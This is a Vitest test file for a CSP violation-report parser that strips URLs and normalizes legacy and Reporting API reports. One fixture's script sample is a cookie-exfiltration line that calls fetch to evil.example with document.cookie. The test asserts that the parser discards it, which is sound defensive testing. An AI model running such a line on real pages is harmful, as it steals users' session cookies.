import { describe, expect, it } from 'vitest';
import { ZodError } from 'zod';
import {
  cspReportFormat,
  MAX_REPORTS_PER_BATCH,
  parseCspReport,
  stripUrl,
} from '@/lib/infra/security/csp-report';

describe('stripUrl', () => {
  it('drops the query string, fragment and credentials', () => {
    expect(
      stripUrl('https://u:p@kallo.fit/en/waitlist/confirm?token=secret#x')
    ).toBe('https://kallo.fit/en/waitlist/confirm');
  });

  it('keeps CSP keywords and reduces opaque schemes to the scheme', () => {
    expect(stripUrl('inline')).toBe('inline');
    expect(stripUrl('eval')).toBe('eval');
    expect(stripUrl('data:text/html;base64,PHNjcmlwdD4=')).toBe('data:');
  });

  // Codex review on #382: an invite slug in the PATH is a usable capability.
  it('templates capability-bearing path segments', () => {
    expect(stripUrl('https://kallo.fit/en/invite/Xk9pQ2rT?utm=1')).toBe(
      'https://kallo.fit/en/invite/:param'
    );
    expect(stripUrl('/vi/circle/0b6f0a4e-8c1f-4d7b-9a55-3f1e2d4c5b6a')).toBe(
      '/vi/circle/:param'
    );
  });

  it('strips a relative path too, and caps the length', () => {
    expect(stripUrl('/auth/callback?code=abc')).toBe('/auth/callback');
    expect(
      stripUrl(`https://kallo.fit/_next/static/chunks/${'a'.repeat(1000)}.js`)
    ).toHaveLength(256);
  });
});

describe('cspReportFormat', () => {
  it('maps the two report media types and ignores parameters', () => {
    expect(cspReportFormat('application/csp-report')).toBe('legacy');
    expect(cspReportFormat('application/reports+json; charset=utf-8')).toBe(
      'reporting-api'
    );
  });

  it('refuses anything else', () => {
    expect(cspReportFormat('application/json')).toBeNull();
    expect(cspReportFormat(null)).toBeNull();
  });
});

describe('parseCspReport', () => {
  it('normalizes a legacy report-uri body', () => {
    const [violation] = parseCspReport('legacy', {
      'csp-report': {
        'document-uri': 'https://kallo.fit/en/auth/callback?code=secret',
        'blocked-uri': 'https://evil.example/steal?c=abc',
        'violated-directive': "connect-src 'self' https://abc.supabase.co",
        'original-policy': "default-src 'self'; …",
        disposition: 'enforce',
        'source-file': 'https://kallo.fit/_next/static/chunks/a.js?v=1',
        'line-number': 3,
        'column-number': 14,
        'status-code': 200,
        'script-sample': 'fetch("https://evil.example/?c="+document.cookie)',
      },
    });

    expect(violation).toEqual({
      disposition: 'enforce',
      directive: 'connect-src',
      document: 'https://kallo.fit/en/auth/callback',
      blocked: 'https://evil.example/:param',
      source: 'https://kallo.fit/_next/static/chunks/a.js',
      line: 3,
      column: 14,
      status: 200,
    });
    // The script sample and the policy echo are never kept.
    expect(JSON.stringify(violation)).not.toContain('cookie');
    expect(JSON.stringify(violation)).not.toContain('secret');
  });

  it('normalizes a Reporting API batch and drops non-CSP entries', () => {
    const violations = parseCspReport('reporting-api', [
      {
        type: 'csp-violation',
        age: 10,
        url: 'https://kallo.fit/en?ref=x',
        user_agent: 'Mozilla/5.0',
        body: {
          documentURL: 'https://kallo.fit/en?ref=x',
          blockedURL: 'inline',
          effectiveDirective: 'script-src-elem',
          disposition: 'report',
          sample: 'alert(1)',
        },
      },
      { type: 'deprecation', url: 'https://kallo.fit/en', body: {} },
    ]);

    expect(violations).toEqual([
      {
        disposition: 'report',
        directive: 'script-src-elem',
        document: 'https://kallo.fit/en',
        blocked: 'inline',
      },
    ]);
  });

  it('keeps at most MAX_REPORTS_PER_BATCH violations from one batch', () => {
    const entry = {
      type: 'csp-violation',
      body: {
        documentURL: 'https://kallo.fit/en',
        effectiveDirective: 'img-src',
      },
    };
    const violations = parseCspReport(
      'reporting-api',
      Array.from({ length: 60 }, () => entry)
    );
    expect(violations).toHaveLength(MAX_REPORTS_PER_BATCH);
  });

  it('rejects a body that does not match its declared format', () => {
    expect(() => parseCspReport('legacy', [{ type: 'csp-violation' }])).toThrow(
      ZodError
    );
    expect(() => parseCspReport('reporting-api', { 'csp-report': {} })).toThrow(
      ZodError
    );
    expect(() =>
      parseCspReport('legacy', { 'csp-report': { 'document-uri': 42 } })
    ).toThrow(ZodError);
  });

  it('rejects an absurdly long batch outright', () => {
    expect(() =>
      parseCspReport(
        'reporting-api',
        Array.from({ length: 101 }, () => ({ type: 'csp-violation' }))
      )
    ).toThrow(ZodError);
  });
});
